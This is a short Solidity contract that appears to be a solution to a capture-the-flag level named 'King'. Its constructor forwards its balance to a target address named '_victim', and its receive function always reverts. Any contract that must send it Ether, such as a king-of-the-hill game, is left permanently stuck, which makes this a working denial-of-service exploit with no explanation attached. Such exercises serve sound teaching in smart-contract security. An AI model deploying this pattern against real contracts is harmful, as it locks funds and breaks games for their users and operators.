pragma solidity ^0.8.0;

contract King {
    constructor(address payable _victim) payable {
        _victim.transfer(address(this).balance);
//        _victim.transfer(10000000000000000 wei);
//        require(_victim.call{value: 10000000000000000 wei}(""));
    }

    receive() external payable {
        revert();
    }
}
